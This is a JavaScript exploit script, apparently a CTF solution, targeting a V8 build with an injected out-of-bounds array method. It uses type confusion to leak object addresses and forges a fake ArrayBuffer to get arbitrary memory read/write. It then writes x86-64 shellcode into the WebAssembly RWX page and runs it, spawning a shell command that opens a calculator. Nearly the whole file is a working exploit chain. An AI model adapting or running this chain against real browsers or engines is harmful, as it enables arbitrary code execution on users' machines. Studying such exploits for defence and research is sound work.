class typeConvert
{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    f2u(val){        //double ==> Uint64
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2f(val){        //Uint64 ==> double
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}
var tC = new typeConvert();

function hex(x)
{
   return '0x' + (x.toString(16)).padStart(16, 0);
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
let wasmFunc = wasmInstance.exports.main;

var fake_arraybuffer = [
	//map|properties
    tC.u2f(0x0),
	tC.u2f(0x0),
	//elements|length
	tC.u2f(0x0),
	tC.u2f(0x1000),
	//backingstore|0x2
	tC.u2f(0x0),
	tC.u2f(0x2),
	//padding
	tC.u2f(0x0),
	tC.u2f(0x0),
	//fake map
	tC.u2f(0x0),
	tC.u2f(0x1900042319080808),
	tC.u2f(0x00000000082003ff),
	tC.u2f(0x0),
	tC.u2f(0x0),
	tC.u2f(0x0),
	tC.u2f(0x0),
	tC.u2f(0x0)
].slice(0);


var ab = new ArrayBuffer(0x1000).slice(0);
var obj = [wasmInstance, fake_arraybuffer, ab].slice(0);
var buf = [1.1, 2.2, 3.3].slice(0);

obj_map = tC.f2u(obj.oob());
console.log("[*]obj_map addr -> "+hex(obj_map));
buf_map = tC.f2u(buf.oob());
console.log("[*]buf_map addr -> "+hex(buf_map));

obj.oob(tC.u2f(buf_map));		//将obj数组的map改为double map

wasm_inst_addr = tC.f2u(obj[0]) - 1;	//读取wasm_instance的地址
rwx_area_addr = wasm_inst_addr + 0x88	//获取rwx地址的存放地址
console.log("[*]RWX_area_addr -> "+hex(rwx_area_addr));

fake_ab_addr = tC.f2u(obj[1]) - 1;		//读取fake_arraybuffer的地址
console.log("[*]fake_ab_addr -> "+hex(fake_ab_addr));
fake_obj_addr = fake_ab_addr - 0x80;	//获取fake_arraybuffer的elements的地址
fake_obj_map = fake_ab_addr - 0x40;		//获取伪造的map地址

fake_arraybuffer[0] = tC.u2f(fake_obj_map + 1);	//将伪造的map填入
fake_arraybuffer[4] = tC.u2f(rwx_area_addr);		//将rwx地址的存放地址填入backingStore

obj[2] = tC.u2f(fake_obj_addr + 1);	//将elements地址写入obj数组
obj.oob(tC.u2f(obj_map));				//恢复obj数组的map

fake_obj = new DataView(obj[2]);		//将伪造的ArrayBuffer取出

rwx_area = tC.f2u(fake_obj.getFloat64(0, true));
console.log("[*]rwx_area -> " + hex(rwx_area));	//读取rwx空间的地址

fake_arraybuffer[4] = tC.u2f(rwx_area);
shellcode = [0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,0x1c,0x00,0x00,0x00,0x44,0x49,0x53,0x50,0x4c,0x41,0x59,0x3d,0x3a,0x30,0x20,0x67,0x6e,0x6f,0x6d,0x65,0x2d,0x63,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05];



//shellcode = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 0x52, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x00];
for (i = 0; i < shellcode.length; i++){
    fake_obj.setUint8(i , shellcode[i], true);
}

wasmFunc();


